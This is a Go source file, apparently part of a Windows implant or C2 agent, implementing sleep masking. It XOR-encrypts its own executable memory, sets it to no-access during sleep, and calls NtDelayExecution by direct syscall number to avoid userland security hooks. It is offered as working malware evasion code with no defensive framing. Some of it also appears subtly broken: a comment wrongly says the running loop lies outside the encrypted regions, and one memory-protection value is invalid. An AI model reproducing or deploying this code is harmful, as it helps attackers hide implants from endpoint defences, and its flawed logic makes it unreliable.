//go:build windows

package win

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageNoAccess          = 0x01
	pageReadWrite         = 0x04
	memImage              = 0x1000000
	pageExec              = 0x10
)

// execRegion is one executable region owned by the current image.
type execRegion struct {
	base uintptr
	size uintptr
}

// moduleExecRegions enumerates MEM_IMAGE regions of the current module that are
// executable (the .text region and friends) using VirtualQuery.
func moduleExecRegions() ([]execRegion, error) {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil {
		return nil, errNoNtdll
	}
	imageBase := peb.ImageBaseAddress
	var regions []execRegion
	addr := imageBase
	var mbi windows.MemoryBasicInformation
	for {
		if err := windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
			break
		}
		if mbi.RegionSize == 0 {
			break
		}
		if mbi.Type == memImage && mbi.Protect&pageExec != 0 {
			regions = append(regions, execRegion{base: mbi.BaseAddress, size: mbi.RegionSize})
		}
		next := addr + mbi.RegionSize
		if next <= addr {
			break
		}
		addr = next
	}
	return regions, nil
}

// maskWithKey XOR-encrypts (on=true) or decrypts (on=false) every executable
// region using the key. Uses a rolling key stream so the XOR is not trivially
// byte-identical.
func maskWithKey(key []byte, on bool) error {
	if len(key) == 0 {
		key = []byte{0xAA, 0x55, 0x3C, 0xC3}
	}
	regions, err := moduleExecRegions()
	if err != nil {
		return err
	}
	for _, r := range regions {
		// Ensure writable for the XOR pass.
		_, _ = VirtualProtectLocal(r.base, r.size, pageReadWrite)
		var ki int
		region := unsafe.Slice((*byte)(unsafe.Pointer(r.base)), r.size)
		for i := range region {
			// alternate key to avoid self-encryption of the loop (the loop is
			// in Go, so it is not in these regions while it runs).
			region[i] ^= key[ki%len(key)] ^ byte(i)
			ki++
		}
		if on {
			_, _ = VirtualProtectLocal(r.base, r.size, pageNoAccess)
		} else {
			_, _ = VirtualProtectLocal(r.base, r.size, pageExec|pageReadWrite)
		}
	}
	return nil
}

// MaskSleep encrypts the module's executable regions, sleeps via
// NtDelayExecution, then restores them. The caller must ensure no other
// goroutine executes agent code during the masked window (run it on a dedicated
// thread with the scheduler parked).
func MaskSleep(ms int) error {
	key := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xDE, 0xBA, 0xBE}
	if err := maskWithKey(key, true); err != nil {
		return err
	}
	if err := delayExecution(ms); err != nil {
		_ = maskWithKey(key, false) // best-effort restore
		return err
	}
	return maskWithKey(key, false)
}

// delayExecution calls NtDelayExecution (equivalent of Sleep) via the resolved
// SSN, so the sleep itself does not touch userland hooks.
func delayExecution(ms int) error {
	ssn, ok := SSNByName("NtDelayExecution")
	if !ok {
		// fall back to kernel32 Sleep through the resolved pointer.
		k32 := ModuleKernel32()
		proc, err := Resolve(k32, "Sleep")
		if err != nil {
			return err
		}
		syscallN(proc, uintptr(ms), 0, 0, 0, 0, 0)
		return nil
	}
	interval := int64(ms) * 10000 // 100ns units
	invokeDirect(ssn.SSN, 0, uintptr(unsafe.Pointer(&interval)), 0, 0, 0)
	return nil
}
